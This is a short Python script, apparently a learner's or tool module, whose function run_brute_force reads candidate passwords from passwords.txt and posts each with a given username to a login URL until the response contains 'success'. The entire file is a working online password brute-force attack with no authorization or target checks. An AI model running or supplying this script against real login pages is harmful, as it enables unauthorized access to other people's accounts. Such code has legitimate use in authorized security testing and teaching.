import requests

def run_brute_force(url,username):
    try:
        with open("passwords.txt","r") as file:
            passwords=file.readlines()
    except:
        return ["passwords.txt not found"] 

    # url = input("Enter login URL: ")
    # username = input("Enter username: ")

    results=[]
    found=False
    

    # try:
    #     with open("passwords.txt", "r") as file:
    #         passwords = file.readlines()
    # except:
    #     print("passwords.txt not found!")
    #     return

    for pwd in passwords:
        pwd = pwd.strip()

        data = {
            "username": username,
            "password": pwd
        }

        try:
            response = requests.post(url, data=data,timeout=5)


            msg=f"Tried: {pwd} | Length: {len(response.text)}"
            results.append(msg)

            if "success" in response.text.lower():
                results.append(f"\nPassword found: {pwd}")
                found=True
                break

        except requests.exceptions.RequestException:
            results.append(f"Error with request for password : {pwd}")
    
    if not found:
        results.append("Password not found")
    return results